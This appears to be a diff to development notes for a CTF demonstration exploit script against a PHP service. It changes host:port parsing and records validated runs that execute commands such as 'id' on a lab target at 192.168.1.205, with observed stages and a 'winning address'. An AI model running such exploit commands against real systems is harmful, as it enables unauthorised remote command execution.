@@ -501,6 +501,7 @@ Last updated: 2026-05-15 05:32:17 CEST
   - no per-line `|` prefix,
   - no forced text wrapping,
   - final command output is plain terminal text in a high-contrast color when color is enabled.
+- Updated v1.9 target parsing so `--host` accepts `HOST:PORT`; `--port` is still accepted as a fallback/override.
 - Validated that `phpinfo()` is not required by running with `--phpinfo-path ''`:
   - the start banner reported `phpinfo disabled`,
   - PHP version/API fields reported `not learned`,
@@ -509,7 +510,7 @@ Last updated: 2026-05-15 05:32:17 CEST
 - Validated command:
 
 ```bash
-./demo_ctf_exploit_v1_9.py --host 192.168.1.205 --cmd 'ls -la /app/tmp' --fast --artifact-dir artifacts --phpinfo-path ''
+./demo_ctf_exploit_v1_9.py --host 192.168.1.205:19321 --cmd 'ls -la /app/tmp' --fast --artifact-dir artifacts --phpinfo-path ''
 ```
 
 - Observed:
@@ -520,5 +521,16 @@ Last updated: 2026-05-15 05:32:17 CEST
 - Current preferred recording command:
 
 ```bash
-./demo_ctf_exploit_v1_9.py --host 192.168.1.205 --port 19321 --cmd id --clear
+./demo_ctf_exploit_v1_9.py --host 192.168.1.205:19321 --cmd id --clear
 ```
+
+- Validated `HOST:PORT` parsing in a live exploit run:
+
+```bash
+./demo_ctf_exploit_v1_9.py --host 192.168.1.205:19321 --cmd id --fast --rounds 1 --artifact-dir artifacts --phpinfo-path ''
+```
+
+- Observed:
+  - stage `[04]` is now `Remote command verification setup`,
+  - first winning address `0x55e4210b2127`, body offset `1376`,
+  - artifact: `artifacts/demo_v1_9_20260515-060834.json`.
